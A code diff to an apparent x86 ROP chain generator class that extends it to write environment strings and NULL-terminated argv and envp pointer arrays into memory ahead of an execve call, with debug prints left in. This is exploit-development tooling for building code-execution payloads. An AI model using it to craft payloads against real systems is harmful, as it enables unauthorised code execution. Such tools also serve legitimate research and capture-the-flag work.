@@ -228,7 +228,7 @@ class ROPMakerX86(object):
 
                 dataOffset += len(chunk)
 
-            # Store terminating char after arg
+            # Store terminating char (\0) after arg
             buff += pack('<I', popDst["vaddr"])
             buff += pack('<I', dataAddr + dataOffset)
             buff = self.__buffPadding(popDst, {}, buff)
@@ -267,35 +267,100 @@ class ROPMakerX86(object):
 
             dataOffset += 4
 
-        # Create arr of pointers to env
+        # The argv array must be terminated
+        #        by a NULL pointer.  (Thus, in the new program, argv[argc] will be
+        #        NULL.)
+        buff += pack('<I', popDst["vaddr"])
+        buff += pack('<I', dataAddr + dataOffset)
+        buff = self.__buffPadding(popDst, {}, buff)
+        buff += pack('<I', xorSrc["vaddr"])
+        buff = self.__buffPadding(xorSrc, {}, buff)
+        buff += pack('<I', write4where["vaddr"])
+        buff = self.__buffPadding(write4where, {}, buff)
 
-        envpPointer = dataAddr + dataOffset
+        dataOffset += 4
 
-        if len(envPointers) == 0:
-            print("No envp")
-            # Store Null incase of no args
-            buff += pack('<I', popDst["vaddr"])
-            buff += pack('<I', dataAddr + dataOffset)
-            buff = self.__buffPadding(popDst, {}, buff)
-            buff += pack('<I', xorSrc["vaddr"])
-            buff = self.__buffPadding(xorSrc, {}, buff)
-            buff += pack('<I', write4where["vaddr"])
-            buff = self.__buffPadding(write4where, {}, buff)
+        # Store env @ .data + @ args list
 
-            dataOffset += 4
-        else:
-            for pointer in argPointers:
+        for var in env:
+            print(var)
+            print(dataOffset)
+            envPointers.append(dataAddr + dataOffset)
+            for i in range(0,len(var), 4):
+                chunk = var[i:i+4]
+                chunkBytes = bytes(chunk, 'ascii')
+
+                # Force chunk to be full word, otherwise instructions become offset on stack
+                if len(chunk) % 4 != 0:
+                    # for i in range(4 - len(chunk) % 4)
+                    chunkBytes += bytes('P', 'ascii') * (4 - (len(chunk) % 4))
+
+                print(i)
+                print(chunk)
+                print(chunkBytes.hex())
+
                 buff += pack('<I', popDst["vaddr"])
                 buff += pack('<I', dataAddr + dataOffset)
                 buff = self.__buffPadding(popDst, {}, buff)
                 buff += pack('<I', popSrc["vaddr"])
-                buff += pack('<I', pointer)
-                buff = self.__buffPadding(popSrc, {popDst["gadget"].split()[1]: dataAddr + dataOffset},
-                                          buff)  # Don't overwrite reg dst
+                buff += chunkBytes
+                buff = self.__buffPadding(popSrc, {popDst["gadget"].split()[1]: dataAddr + dataOffset}, buff)  # Don't overwrite reg dst
                 buff += pack('<I', write4where["vaddr"])
                 buff = self.__buffPadding(write4where, {}, buff)
 
-                dataOffset += 4
+                dataOffset += len(chunk)
+
+            # Store terminating char (\0) after arg
+            buff += pack('<I', popDst["vaddr"])
+            buff += pack('<I', dataAddr + dataOffset)
+            buff = self.__buffPadding(popDst, {}, buff)
+            buff += pack('<I',xorSrc["vaddr"])
+            buff = self.__buffPadding(xorSrc, {}, buff)
+            buff += pack('<I', write4where["vaddr"])
+            buff = self.__buffPadding(write4where, {}, buff)
+
+            dataOffset += 1
+
+        endOfEnv = dataAddr + dataOffset
+
+        # Create arr of pointers to env
+
+        # print("before alignment")
+        # print(dataOffset)
+        if dataOffset % 4 != 0:
+            # Align pointer arr
+            dataOffset += 4 - (dataOffset % 4)
+        # print("after alignment")
+        # print(dataOffset)
+
+        envpPointer = dataAddr + dataOffset
+
+        print(envPointers)
+        for pointer in envPointers:
+            print(pointer)
+            print(dataOffset)
+            buff += pack('<I', popDst["vaddr"])
+            buff += pack('<I', dataAddr + dataOffset)
+            buff = self.__buffPadding(popDst, {}, buff)
+            buff += pack('<I', popSrc["vaddr"])
+            buff += pack('<I', pointer)
+            buff = self.__buffPadding(popSrc, {popDst["gadget"].split()[1]: dataAddr + dataOffset},
+                                      buff)  # Don't overwrite reg dst
+            buff += pack('<I', write4where["vaddr"])
+            buff = self.__buffPadding(write4where, {}, buff)
+
+            dataOffset += 4
+
+        # The envp array must be terminated by a NULL pointer.
+        buff += pack('<I', popDst["vaddr"])
+        buff += pack('<I', dataAddr + dataOffset)
+        buff = self.__buffPadding(popDst, {}, buff)
+        buff += pack('<I', xorSrc["vaddr"])
+        buff = self.__buffPadding(xorSrc, {}, buff)
+        buff += pack('<I', write4where["vaddr"])
+        buff = self.__buffPadding(write4where, {}, buff)
+
+        dataOffset += 4
 
         # Execve call setup
 
